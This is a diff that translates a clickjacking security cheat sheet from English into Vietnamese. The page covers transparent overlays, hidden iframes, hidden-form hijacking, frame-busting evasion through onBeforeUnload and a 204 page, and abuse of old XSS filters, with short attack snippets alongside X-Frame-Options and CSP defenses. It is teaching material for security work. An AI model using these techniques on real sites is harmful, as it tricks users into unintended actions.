@@ -1,46 +1,44 @@
 # Clickjacking
 
-> Clickjacking is a type of web security vulnerability where a malicious website tricks a user into clicking on something different from what the user perceives, potentially causing the user to perform unintended actions without their knowledge or consent. Users are tricked into performing all sorts of unintended actions as such as typing in the password, clicking on ‘Delete my account' button, liking a post, deleting a post, commenting on a blog. In other words all the actions that a normal user can do on a legitimate website can be done using clickjacking.
+> Clickjacking là một loại lỗ hổng bảo mật web trong đó một trang web độc hại đánh lừa người dùng nhấp vào một thứ gì đó khác với những gì họ tưởng là đang nhấp vào, có khả năng khiến người dùng thực hiện các hành động ngoài ý muốn mà họ không hề hay biết hoặc không đồng ý. Người dùng bị lừa thực hiện đủ loại hành động ngoài ý muốn như nhập mật khẩu, nhấp vào nút 'Xóa tài khoản của tôi', thích một bài đăng, xóa một bài đăng, bình luận trên một blog. Nói cách khác, tất cả các hành động mà một người dùng bình thường có thể thực hiện trên một trang web hợp pháp đều có thể được thực hiện bằng clickjacking.
 
-## Summary
+## Tóm tắt
 
-* [Tools](#tools)
-* [Methodology](#methodology)
+* [Công cụ](#tools)
+* [Phương pháp](#methodology)
     * [UI Redressing](#ui-redressing)
     * [Invisible Frames](#invisible-frames)
     * [Button/Form Hijacking](#buttonform-hijacking)
-    * [Execution Methods](#execution-methods)
-* [Preventive Measures](#preventive-measures)
-    * [Implement X-Frame-Options Header](#implement-x-frame-options-header)
+    * [Các phương pháp thực thi](#execution-methods)
+* [Biện pháp phòng ngừa](#preventive-measures)
+    * [Triển khai Header X-Frame-Options](#implement-x-frame-options-header)
     * [Content Security Policy (CSP)](#content-security-policy-csp)
-    * [Disabling JavaScript](#disabling-javascript)
-* [OnBeforeUnload Event](#onbeforeunload-event)
-* [XSS Filter](#xss-filter)
-    * [IE8 XSS filter](#ie8-xss-filter)
-    * [Chrome 4.0 XSSAuditor filter](#chrome-40-xssauditor-filter)
-* [Challenge](#challenge)
+    * [Vô hiệu hóa JavaScript](#disabling-javascript)
+* [Sự kiện OnBeforeUnload](#onbeforeunload-event)
+* [Bộ lọc XSS](#xss-filter)
+    * [Bộ lọc XSS của IE8](#ie8-xss-filter)
+    * [Bộ lọc XSSAuditor của Chrome 4.0](#chrome-40-xssauditor-filter)
+* [Thử thách](#challenge)
 * [Labs](#labs)
-* [References](#references)
+* [Tài liệu tham khảo](#references)
 
-## Tools
+## Công cụ
 
 * [portswigger/burp](https://portswigger.net/burp)
 * [zaproxy/zaproxy](https://github.com/zaproxy/zaproxy)
 * [machine1337/clickjack](https://github.com/machine1337/clickjack)
 
-## Methodology
+## Phương pháp
 
 ### UI Redressing
 
-UI Redressing is a Clickjacking technique where an attacker overlays a transparent UI element on top of a legitimate website or application.
-The transparent UI element contains malicious content or actions that are visually hidden from the user. By manipulating the transparency and positioning of elements,
-the attacker can trick the user into interacting with the hidden content, believing they are interacting with the visible interface.
+UI Redressing là một kỹ thuật Clickjacking trong đó kẻ tấn công phủ một phần tử giao diện (UI) trong suốt lên trên một trang web hoặc ứng dụng hợp pháp. Phần tử UI trong suốt này chứa nội dung hoặc hành động độc hại được ẩn khỏi tầm mắt người dùng. Bằng cách thao túng độ trong suốt và vị trí của các phần tử, kẻ tấn công có thể đánh lừa người dùng tương tác với nội dung ẩn, khiến họ tin rằng mình đang tương tác với giao diện hiển thị.
 
-* **How UI Redressing Works:**
-    * Overlaying Transparent Element: The attacker creates a transparent HTML element (usually a `<div>`) that covers the entire visible area of a legitimate website. This element is made transparent using CSS properties like `opacity: 0;`.
-    * Positioning and Layering: By setting the CSS properties such as `position: absolute; top: 0; left: 0;`, the transparent element is positioned to cover the entire viewport. Since it's transparent, the user doesn't see it.
-    * Misleading User Interaction: The attacker places deceptive elements within the transparent container, such as fake buttons, links, or forms. These elements perform actions when clicked, but the user is unaware of their presence due to the overlaying transparent UI element.
-    * User Interaction: When the user interacts with the visible interface, they are unknowingly interacting with the hidden elements due to the transparent overlay. This interaction can lead to unintended actions or unauthorized operations.
+* **Cách UI Redressing hoạt động:**
+    * Phủ phần tử trong suốt: Kẻ tấn công tạo ra một phần tử HTML trong suốt (thường là một `<div>`) bao phủ toàn bộ vùng hiển thị của một trang web hợp pháp. Phần tử này được làm trong suốt bằng các thuộc tính CSS như `opacity: 0;`.
+    * Định vị và phân lớp: Bằng cách thiết lập các thuộc tính CSS như `position: absolute; top: 0; left: 0;`, phần tử trong suốt được định vị để bao phủ toàn bộ viewport. Vì nó trong suốt nên người dùng không nhìn thấy nó.
+    * Tương tác gây hiểu lầm: Kẻ tấn công đặt các phần tử lừa đảo bên trong container trong suốt, chẳng hạn như nút giả, liên kết giả, hoặc form giả. Các phần tử này thực hiện hành động khi được nhấp, nhưng người dùng không nhận biết được sự tồn tại của chúng do lớp UI trong suốt phủ lên trên.
+    * Tương tác của người dùng: Khi người dùng tương tác với giao diện hiển thị, họ vô tình tương tác với các phần tử ẩn do lớp phủ trong suốt. Sự tương tác này có thể dẫn đến các hành động ngoài ý muốn hoặc các thao tác trái phép.
 
 ```html
 <div style="opacity: 0; position: absolute; top: 0; left: 0; height: 100%; width: 100%;">
@@ -50,33 +48,31 @@ the attacker can trick the user into interacting with the hidden content, believ
 
 ### Invisible Frames
 
-Invisible Frames is a Clickjacking technique where attackers use hidden iframes to trick users into interacting with content from another website unknowingly.
-These iframes are made invisible by setting their dimensions to zero (height: 0; width: 0;) and removing their borders (border: none;).
-The content inside these invisible frames can be malicious, such as phishing forms, malware downloads, or any other harmful actions.
+Invisible Frames là một kỹ thuật Clickjacking trong đó kẻ tấn công sử dụng các iframe ẩn để đánh lừa người dùng tương tác với nội dung từ một trang web khác mà không hề hay biết. Các iframe này được làm cho vô hình bằng cách đặt kích thước của chúng về 0 (height: 0; width: 0;) và loại bỏ đường viền (border: none;). Nội dung bên trong các frame vô hình này có thể là độc hại, chẳng hạn như form phishing, tải xuống malware, hoặc bất kỳ hành động gây hại nào khác.
 
-* **How Invisible Frames Work:**
-    * Hidden IFrame Creation: The attacker includes an `<iframe>` element in a webpage, setting its dimensions to zero and removing its border, making it invisible to the user.
+* **Cách Invisible Frames hoạt động:**
+    * Tạo IFrame ẩn: Kẻ tấn công chèn một phần tử `<iframe>` vào một trang web, đặt kích thước của nó về 0 và loại bỏ đường viền, khiến nó vô hình đối với người dùng.
 
       ```html
       <iframe src="malicious-site" style="opacity: 0; height: 0; width: 0; border: none;"></iframe>
       ```
 
-    * Loading Malicious Content: The src attribute of the iframe points to a malicious website or resource controlled by the attacker. This content is loaded silently without the user's knowledge because the iframe is invisible.
-    * User Interaction: The attacker overlays enticing elements on top of the invisible iframe, making it seem like the user is interacting with the visible interface. For instance, the attacker might position a transparent button over the invisible iframe. When the user clicks the button, they are essentially clicking on the hidden content within the iframe.
-    * Unintended Actions: Since the user is unaware of the invisible iframe, their interactions can lead to unintended actions, such as submitting forms, clicking on malicious links, or even performing financial transactions without their consent.
+    * Tải nội dung độc hại: Thuộc tính src của iframe trỏ đến một trang web hoặc tài nguyên độc hại do kẻ tấn công kiểm soát. Nội dung này được tải một cách âm thầm mà người dùng không hề hay biết vì iframe là vô hình.
+    * Tương tác của người dùng: Kẻ tấn công phủ các phần tử hấp dẫn lên trên iframe vô hình, khiến người dùng tưởng như mình đang tương tác với giao diện hiển thị. Ví dụ, kẻ tấn công có thể đặt một nút trong suốt lên trên iframe vô hình. Khi người dùng nhấp vào nút, về bản chất họ đang nhấp vào nội dung ẩn bên trong iframe.
+    * Hành động ngoài ý muốn: Vì người dùng không biết đến sự tồn tại của iframe vô hình, các tương tác của họ có thể dẫn đến những hành động ngoài ý muốn, chẳng hạn như gửi form, nhấp vào các liên kết độc hại, hoặc thậm chí thực hiện các giao dịch tài chính mà không có sự đồng ý của họ.
 
 ### Button/Form Hijacking
 
-Button/Form Hijacking is a Clickjacking technique where attackers trick users into interacting with invisible or hidden buttons/forms, leading to unintended actions on a legitimate website. By overlaying deceptive elements on top of visible buttons or forms, attackers can manipulate user interactions to perform malicious actions without the user's knowledge.
+Button/Form Hijacking là một kỹ thuật Clickjacking trong đó kẻ tấn công đánh lừa người dùng tương tác với các nút/form vô hình hoặc ẩn, dẫn đến các hành động ngoài ý muốn trên một trang web hợp pháp. Bằng cách phủ các phần tử lừa đảo lên trên các nút hoặc form hiển thị, kẻ tấn công có thể thao túng các tương tác của người dùng để thực hiện các hành động độc hại mà người dùng không hề hay biết.
 
-* **How Button/Form Hijacking Works:**
-    * Visible Interface: The attacker presents a visible button or form to the user, encouraging them to click or interact with it.
+* **Cách Button/Form Hijacking hoạt động:**
+    * Giao diện hiển thị: Kẻ tấn công trình bày một nút hoặc form hiển thị cho người dùng, khuyến khích họ nhấp hoặc tương tác với nó.
 
     ```html
     <button onclick="submitForm()">Click me</button>
     ```
 
-    * Invisible Overlay: The attacker overlays this visible button or form with an invisible or transparent element that contains a malicious action, such as submitting a hidden form.
+    * Lớp phủ vô hình: Kẻ tấn công phủ nút hoặc form hiển thị này bằng một phần tử vô hình hoặc trong suốt chứa một hành động độc hại, chẳng hạn như gửi một form ẩn.
 
     ```html
     <form action="malicious-site" method="POST" id="hidden-form" style="display: none;">
@@ -84,7 +80,7 @@ Button/Form Hijacking is a Clickjacking technique where attackers trick users in
     </form>
     ```
 
-    * Deceptive Interaction: When the user clicks the visible button, they are unknowingly interacting with the hidden form due to the invisible overlay. The form is submitted, potentially causing unauthorized actions or data leakage.
+    * Tương tác gây hiểu lầm: Khi người dùng nhấp vào nút hiển thị, họ vô tình tương tác với form ẩn do lớp phủ vô hình. Form được gửi đi, có khả năng gây ra các hành động trái phép hoặc rò rỉ dữ liệu.
 
     ```html
     <button onclick="submitForm()">Click me</button>
@@ -98,9 +94,9 @@ Button/Form Hijacking is a Clickjacking technique where attackers trick users in
     </script>
     ```
 
-### Execution Methods
+### Các phương pháp thực thi
 
-* Creating Hidden Form: The attacker creates a hidden form containing malicious input fields, targeting a vulnerable action on the victim's website. This form remains invisible to the user.
+* Tạo Form ẩn: Kẻ tấn công tạo một form ẩn chứa các trường input độc hại, nhắm vào một hành động dễ bị tổn thương trên trang web của nạn nhân. Form này luôn ẩn khỏi tầm mắt người dùng.
 
 ```html
   <form action="malicious-site" method="POST" id="hidden-form" style="display: none;">
@@ -109,7 +105,7 @@ Button/Form Hijacking is a Clickjacking technique where attackers trick users in
   </form>
 ```
 
-* Overlaying Visible Element: The attacker overlays a visible element (button or form) on their malicious page, encouraging users to interact with it. When the user clicks the visible element, they unknowingly trigger the hidden form's submission.
+* Phủ phần tử hiển thị: Kẻ tấn công phủ một phần tử hiển thị (nút hoặc form) lên trang độc hại của mình, khuyến khích người dùng tương tác với nó. Khi người dùng nhấp vào phần tử hiển thị, họ vô tình kích hoạt việc gửi form ẩn.
 
 ```js
   function submitForm() {
@@ -117,11 +113,11 @@ Button/Form Hijacking is a Clickjacking technique where attackers trick users in
   }
 ```
 
-## Preventive Measures
+## Biện pháp phòng ngừa
 
-### Implement X-Frame-Options Header
+### Triển khai Header X-Frame-Options
 
-Implement the X-Frame-Options header with the DENY or SAMEORIGIN directive to prevent your website from being embedded within an iframe without your consent.
+Triển khai header X-Frame-Options với chỉ thị DENY hoặc SAMEORIGIN để ngăn trang web của bạn bị nhúng vào bên trong một iframe mà không có sự cho phép của bạn.
 
 ```apache
 Header always append X-Frame-Options SAMEORIGIN
@@ -129,35 +125,34 @@ Header always append X-Frame-Options SAMEORIGIN
 
 ### Content Security Policy (CSP)
 
-Use CSP to control the sources from which content can be loaded on your website, including scripts, styles, and frames.
-Define a strong CSP policy to prevent unauthorized framing and loading of external resources.
-Example in HTML meta tag:
+Sử dụng CSP để kiểm soát các nguồn mà từ đó nội dung có thể được tải trên trang web của bạn, bao gồm script, style, và frame. Định nghĩa một chính sách CSP chặt chẽ để ngăn chặn việc đóng khung (framing) trái phép và tải các tài nguyên bên ngoài.
+Ví dụ trong thẻ meta HTML:
 
 ```html
 <meta http-equiv="Content-Security-Policy" content="frame-ancestors 'self';">
 ```
 
-### Disabling JavaScript
+### Vô hiệu hóa JavaScript
 
-* Since these type of client side protections relies on JavaScript frame busting code, if the victim has JavaScript disabled or it is possible for an attacker to disable JavaScript code, the web page will not have any protection mechanism against clickjacking.
-* There are three deactivation techniques that can be used with frames:
-    * Restricted frames with Internet Explorer: Starting from IE6, a frame can have the "security" attribute that, if it is set to the value "restricted", ensures that JavaScript code, ActiveX controls, and re-directs to other sites do not work in the frame.
+* Vì các loại biện pháp bảo vệ phía client này dựa vào mã "frame busting" bằng JavaScript, nếu nạn nhân tắt JavaScript hoặc kẻ tấn công có thể vô hiệu hóa mã JavaScript, trang web sẽ không có bất kỳ cơ chế bảo vệ nào chống lại clickjacking.
+* Có ba kỹ thuật vô hiệu hóa có thể được sử dụng với frame:
+    * Frame bị hạn chế với Internet Explorer: Bắt đầu từ IE6, một frame có thể có thuộc tính "security" mà, nếu được đặt giá trị "restricted", đảm bảo rằng mã JavaScript, ActiveX controls, và chuyển hướng đến các trang khác sẽ không hoạt động trong frame.
 
     ```html
     <iframe src="http://target site" security="restricted"></iframe>
     ```
 
-    * Sandbox attribute: with HTML5 there is a new attribute called “sandbox”. It enables a set of restrictions on content loaded into the iframe. At this moment this attribute is only compatible with Chrome and Safari.
+    * Thuộc tính Sandbox: với HTML5 có một thuộc tính mới gọi là "sandbox". Nó cho phép áp dụng một tập hợp các hạn chế lên nội dung được tải vào iframe. Tại thời điểm này, thuộc tính này chỉ tương thích với Chrome và Safari.
 
     ```html
     <iframe src="http://target site" sandbox></iframe>
     ```
 
-## OnBeforeUnload Event
+## Sự kiện OnBeforeUnload
 
-* The `onBeforeUnload` event could be used to evade frame busting code. This event is called when the frame busting code wants to destroy the iframe by loading the URL in the whole web page and not only in the iframe. The handler function returns a string that is prompted to the user asking confirm if he wants to leave the page. When this string is displayed to the user is likely to cancel the navigation, defeating target's frame busting attempt.
+* Sự kiện `onBeforeUnload` có thể được sử dụng để né tránh mã frame busting. Sự kiện này được gọi khi mã frame busting muốn phá hủy iframe bằng cách tải URL trong toàn bộ trang web chứ không chỉ trong iframe. Hàm xử lý trả về một chuỗi được nhắc hiển thị cho người dùng để yêu cầu xác nhận xem họ có muốn rời khỏi trang hay không. Khi chuỗi này được hiển thị cho người dùng, họ có khả năng sẽ hủy điều hướng, đánh bại nỗ lực frame busting của mục tiêu.
 
-* The attacker can use this attack by registering an unload event on the top page using the following example code:
+* Kẻ tấn công có thể sử dụng cuộc tấn công này bằng cách đăng ký một sự kiện unload trên trang cấp cao nhất bằng đoạn mã ví dụ sau:
 
 ```html
 <h1>www.fictitious.site</h1>
@@ -170,9 +165,9 @@ Example in HTML meta tag:
 <iframe src="http://target site">
 ```
 
-* The previous technique requires the user interaction but, the same result, can be achieved without prompting the user. To do this the attacker have to automatically cancel the incoming navigation request in an onBeforeUnload event handler by repeatedly submitting (for example every millisecond) a navigation request to a web page that responds with a _"HTTP/1.1 204 No Content"_ header.
+* Kỹ thuật trước đó đòi hỏi sự tương tác của người dùng, nhưng cùng một kết quả có thể đạt được mà không cần nhắc người dùng. Để làm điều này, kẻ tấn công phải tự động hủy yêu cầu điều hướng đang đến trong một trình xử lý sự kiện onBeforeUnload bằng cách liên tục gửi (ví dụ mỗi mili giây) một yêu cầu điều hướng đến một trang web phản hồi bằng header _"HTTP/1.1 204 No Content"_.
 
-204 page:
+Trang 204:
 
 ```php
 <?php
@@ -180,7 +175,7 @@ Example in HTML meta tag:
 ?>
 ```
 
-Attacker's Page:
+Trang của kẻ tấn công:
 
 ```js
 <script>
@@ -199,11 +194,11 @@ Attacker's Page:
 <iframe src="http://target site">
 ```
 
-## XSS Filter
+## Bộ lọc XSS
 
-### IE8 XSS filter
+### Bộ lọc XSS của IE8
 
-This filter has visibility into all parameters of each request and response flowing through the web browser and it compares them to a set of regular expressions in order to look for reflected XSS attempts. When the filter identifies a possible XSS attacks; it disables all inline scripts within the page, including frame busting scripts (the same thing could be done with external scripts). For this reason an attacker could induce a false positive by inserting the beginning of the frame busting script into a request's parameters.
+Bộ lọc này có khả năng nhìn thấy tất cả các tham số của mỗi request và response đi qua trình duyệt web và so sánh chúng với một tập hợp các biểu thức chính quy (regular expressions) để tìm kiếm các nỗ lực tấn công XSS phản chiếu (reflected). Khi bộ lọc xác định một cuộc tấn công XSS có thể xảy ra, nó vô hiệu hóa tất cả các script inline trong trang, bao gồm cả script frame busting (điều tương tự cũng có thể được thực hiện với các script bên ngoài). Vì lý do này, kẻ tấn công có thể tạo ra một kết quả dương tính giả (false positive) bằng cách chèn phần đầu của script frame busting vào các tham số của request.
 
 ```html
 <script>
@@ -214,25 +209,25 @@ This filter has visibility into all parameters of each request and response flow
 </script>
 ```
 
-Attacker View:
+Góc nhìn của kẻ tấn công:
 
 ```html
 <iframe src=”http://target site/?param=<script>if”>
 ```
 
-### Chrome 4.0 XSSAuditor filter
+### Bộ lọc XSSAuditor của Chrome 4.0
 
-It has a little different behaviour compared to IE8 XSS filter, in fact with this filter an attacker could deactivate a “script” by passing its code in a request parameter. This enables the framing page to specifically target a single snippet containing the frame busting code, leaving all the other codes intact.
+Nó có hành vi hơi khác so với bộ lọc XSS của IE8, thực tế với bộ lọc này, kẻ tấn công có thể vô hiệu hóa một "script" bằng cách chuyển mã của nó vào một tham số của request. Điều này cho phép trang đóng khung (framing page) nhắm mục tiêu cụ thể vào một đoạn mã duy nhất chứa mã frame busting, để nguyên các đoạn mã khác.
 
-Attacker View:
+Góc nhìn của kẻ tấn công:
 
 ```html
 <iframe src=”http://target site/?param=if(top+!%3D+self)+%7B+top.location%3Dself.location%3B+%7D”>
 ```
 
-## Challenge
+## Thử thách
 
-Inspect the following code:
+Kiểm tra đoạn mã sau:
 
 ```html
 <div style="position: absolute; opacity: 0;">
@@ -241,16 +236,16 @@ Inspect the following code:
 <button onclick="document.getElementsByTagName('iframe')[0].contentWindow.location='malicious-site.com';">Click me</button>
 ```
 
-Determine the Clickjacking vulnerability within this code snippet. Identify how the hidden iframe is being used to exploit the user's actions when they click the button, leading them to a malicious website.
+Xác định lỗ hổng Clickjacking trong đoạn mã này. Xác định cách iframe ẩn được sử dụng để khai thác hành động của người dùng khi họ nhấp vào nút, dẫn họ đến một trang web độc hại.
 
 ## Labs
 
 * [OWASP WebGoat](https://owasp.org/www-project-webgoat/)
 * [OWASP Client Side Clickjacking Test](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/11-Client_Side_Testing/09-Testing_for_Clickjacking)
 
-## References
+## Tài liệu tham khảo
 
-* [Clickjacker.io - Saurabh Banawar - May 10, 2020](https://web.archive.org/web/20200510214313/https://clickjacker.io/)
-* [Clickjacking - Gustav Rydstedt - April 28, 2020](https://web.archive.org/web/20200428022051/https://owasp.org/www-community/attacks/Clickjacking)
-* [Synopsys Clickjacking - BlackDuck - November 29, 2019](https://web.archive.org/web/20240917212838/https://www.synopsys.com/glossary/what-is-clickjacking.html)
-* [Web-Security Clickjacking - PortSwigger - October 12, 2019](https://web.archive.org/web/20260215062230/https://portswigger.net/web-security/clickjacking)
+* [Clickjacker.io - Saurabh Banawar - 10 tháng 5, 2020](https://web.archive.org/web/20200510214313/https://clickjacker.io/)
+* [Clickjacking - Gustav Rydstedt - 28 tháng 4, 2020](https://web.archive.org/web/20200428022051/https://owasp.org/www-community/attacks/Clickjacking)
+* [Synopsys Clickjacking - BlackDuck - 29 tháng 11, 2019](https://web.archive.org/web/20240917212838/https://www.synopsys.com/glossary/what-is-clickjacking.html)
+* [Web-Security Clickjacking - PortSwigger - 12 tháng 10, 2019](https://web.archive.org/web/20260215062230/https://portswigger.net/web-security/clickjacking)
